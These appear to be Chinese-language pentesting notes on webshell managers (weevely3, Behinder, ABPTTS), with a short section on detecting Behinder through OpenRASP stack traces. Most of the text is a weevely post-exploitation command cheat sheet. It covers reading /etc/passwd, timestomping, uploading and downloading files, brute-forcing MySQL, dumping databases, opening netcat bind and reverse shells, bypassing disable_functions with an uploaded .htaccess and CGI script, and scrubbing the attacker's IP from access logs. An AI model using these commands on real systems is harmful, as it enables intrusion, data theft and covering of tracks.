### Webshell管理与后渗透工具

|名称|管理端的编程语言|针对目标环境|描述|
|:-------------:|--|--|-----|
|[epinna/weevely3](https://github.com/epinna/weevely3)|python|php|文件管理/HTTP(S) proxy/Bruteforce SQL accounts/Port scan|
|[rebeyond/Behinder](https://github.com/rebeyond/Behinder)|Java|php/Java/.NET|“冰蝎” 动态二进制加密 webshell管理端|
|[ABPTTS](https://github.com/nccgroup/ABPTTS)|python|.jsp .war .aspx|TCP tunneling over HTTP/HTTPS for web application servers. 参考[Black Hat USA 2016](https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun) |

### 通过堆栈检测未知webshell(可发现冰蝎webshell)

冰蝎webshell的JSP版本通过自定义ClassLoader + defineClass方法来实现eval特性。
```
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
```

因为冰蝎webshell使用了加密通信流量(AES双向加密)，可绕过WAF/IDS等系统

检测方法:部署在web应用内部的OpenRASP能够看到后门操作日志（需安装 999-event-logger 插件）:
```
[event-logger] Listing directory content: /
[event-logger] Execute command: whoami
```

同样，可通过"命令执行"的堆栈进行检测:
```
java.lang.ProcessBuilder.start
...
net.rebeyond.behinder.payload.java.Cmd.RunCMD
net.rebeyond.behinder.payload.java.Cmd.equals
```

检测方法参考自[百度安全实验室](https://mp.weixin.qq.com/s?src=11&timestamp=1562667020&ver=1718&signature=d-uJaXrL7n3rxgaAIbCwhNwsmR30j*WEc-6KntSfDK53VoJSUODDlwvvxEiF3Y5oN*8PnkZChi5DtxhyhtULFDryXwj927jCv1H2KWYADcTU-VHxlZas6QlTRVxkSkoP&new=1)


#### 后渗透功能

weevely的后渗透功能：
* 主机信息搜集(详细内容参考其他笔记)
  * 工具命令`system_info` 查看当前webshell文件位置 操作系统类型 根目录 php版本 当前用户名 外网IP 等
  * 工具命令`system_procs` 列出进程
  * 工具命令`:system_extensions` 查看php和web中间件信息 能看到apache_modules等信息
  * 工具命令`:audit_phpconf`
* 文件操作
  * 读取文件命令`:audit_etcpasswd` 读取passwd文件(需要足够的权限)
  * 创建文件命令`touch -human-ts '2019-05-29 16:21:42' test.php` 创建文件 可设置创建时间
  * 下载文件命令`:file_download result.zip /Users/xxx/Downloads/result.zip` 把目标站的`result.zip` 下载到本地`Downloads/result.zip`
  * 上传文件命令`:file_upload /Users/xxx/Downloads/1.png file.png -force -vector fwrite`把本地文件/数据 上传到 远程目标站`file.png` 参数`-force`表示如果文件存在则强制覆盖
  * 上传文件命令`:file_upload -content "testdata" data.php` 把本地文件/数据 上传到 远程目标站`data.php`
  * 压缩文件命令`file_zip site.zip ./` 把当前目录下所有文件压缩成site.zip
* net网络请求
  * 端口扫描
    * 工具命令`nmap 127.0.0.1 21,22,80,443,1433,3306,3389,7001` 功能使用PHP函数fsockopen](https://www.php.net/manual/en/function.fsockopen.php)实现
  * proxy
    * 工具命令`:net_proxy` 使用目标主机发起http(s)请求
    * 工具命令`:net_curl http://ipconfig.io/json`  模拟curl 使用目标主机发起http(s)请求
* DB数据库操作
  * SQL交互命令`sql_console -user USER -passwd PASS123 -host 10.2.3.4` 连接MySQL成功则能交互式执行SQL语句如`show databases;`
  * 暴力枚举数据库用户名和口令 只支持mysql和pgsql
    * 工具命令`:bruteforce_sql mysql -hostname localhost -users root -pwds db123456 admin123` 简单枚举 成功会出现`root:pass`
    * 工具命令`:bruteforce_sql mysql -hostname localhost -users USERNAME1 USERNAME2 USERNAME3ROOT -fpwds wordlists/dic.txt`字典枚举
  * dump数据库  支持mysql,pgsql,sqlite,dblib
    * 工具命令`:sql_dump DBname DBuser DBpass -dbms mysql -host localhost:3306 -lpath /Users/xxx/Downloads/dump1.sql` 把数据库dump 保存到本地`dump1.sql`
* 派生shell
  * 正向shell`:backdoor_tcp`
    * 工具命令`:backdoor_tcp 8811 -vector netcat` 在目标主机(被控端)公网IP上开启端口监听 1.1.1.1:8811   主控端执行`nc 1.1.1.1 8811`
    * 工具命令`:backdoor_tcp 8811 -vector netcat_bsd`
    * 工具命令`:backdoor_tcp 8811 -vector python_pty`
    * 工具命令`:backdoor_tcp 8811 -vector socat`
  * 反向shell`:backdoor_reversetcp`
* 命令交互
  * 执行PHP代码 - `:shell_php "phpinfo();"`
  * 执行系统命令 - `:shell_sh pwd -vector proc_open`
  * bypass disable_functions 方法1 - 使用Apache的mod_cgi模块和`.htaccess`文件
    * 工具命令`:audit_disablefunctionbypass` 如果失败会提示
    * 利用前提:Apache使用了mod_cgi模块
    * 问题:php的配置文件`php.ini`中`disable_functions=`说明了禁止执行的php函数，如`exec()`等
    * 启动模块`:audit_disablefunctionbypass` 注意：会上传2个文件 `.htaccess` 和 CGI脚本 `acubu.ved`
    * 通过CGI脚本启动的独立进程`acubu.ved` 即可实现伪终端 进行命令交互 如`ps -aux` `whoami` 等
    * 不需要执行命令则可删除之前上传的2个文件 `:file_rm .htaccess` `:file_rm acubu.ved`
    * 如果不删除之前上传的2个文件 则下次可以直接启动CGI脚本 实现伪终端命令交互 `:audit_disablefunctionbypass -just-run http://localhost/acubu.ved`
  * bypass disable_functions 方法2 - json serializer的UAF漏洞
      * PHP 7.1-7.3 [PHP :: Bug #77843 :: Use after free with json serializer](https://bugs.php.net/bug.php?id=77843) [exploits](https://github.com/mm0r1/exploits/tree/master/php-json-bypass)
* 攻击痕迹清理(详细内容参考其他笔记)
  * 删除某文件(access.log)中 有1.1.1.1的那些行(实测不一定成功 看权限)  自带[3种实现方式](https://github.com/epinna/weevely3/blob/caf8978a50754892f7282d451ad18ab417600636/modules/file/clearlog.py)
    * 使用php代码实现`:file_clearlog -vector php_clear 1.1.1.1 access.log`
    * 使用sed命令实现`:file_clearlog -vector clearlog 1.1.1.1 access.log`
    * 使用sed命令实现`:file_clearlog -vector old_school 1.1.1.1 access.log`
